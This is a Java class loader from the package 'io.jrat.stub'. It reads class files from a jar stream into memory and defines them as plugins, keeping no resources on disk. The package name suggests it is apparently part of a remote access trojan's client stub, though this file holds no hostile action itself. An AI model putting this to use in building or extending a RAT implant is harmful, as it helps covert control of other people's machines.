package io.jrat.stub;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class PluginClassLoader extends ClassLoader {
	
	private Map<String, byte[]> classes = new HashMap<String, byte[]>();
	

	public PluginClassLoader(ClassLoader parent, JarInputStream jis) {
		super(parent);
		this.loadResources(jis);
	}

	@Override
	public InputStream getResourceAsStream(String resource) {
		return null;
	}

	@Override
	public URL getResource(String resource) {
		return null;
	}

		
	@Override
	public Class<?> findClass(String name) throws ClassNotFoundException {
		byte[] data = getClassData(name);
		
		if (data != null) {
			return defineClass(name, data, 0, data.length, this.getClass().getProtectionDomain());
		} else {
			throw new ClassNotFoundException(name);
		}
	}
	
	public void loadResources(JarInputStream stream) {
		byte[] buffer = new byte[1024];

		int count;

		try {
			JarEntry entry = null;
			while ((entry = stream.getNextJarEntry()) != null) {
				int size = (int) entry.getSize();

				ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

				while ((count = stream.read(buffer)) != -1) {
					out.write(buffer, 0, count);
				}

				out.close();

				byte[] array = out.toByteArray();
				
				if (entry.getName().toLowerCase().endsWith(".class")) {
					classes.put(getClassName(entry.getName()), array);
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static String getClassName(String fileName) {
		return fileName.substring(0, fileName.length() - 6).replace('/', '.');
	}
	
	public byte[] getClassData(String name) {
		byte[] b = classes.get(name);
		classes.remove(name);
		return b;
	}
}
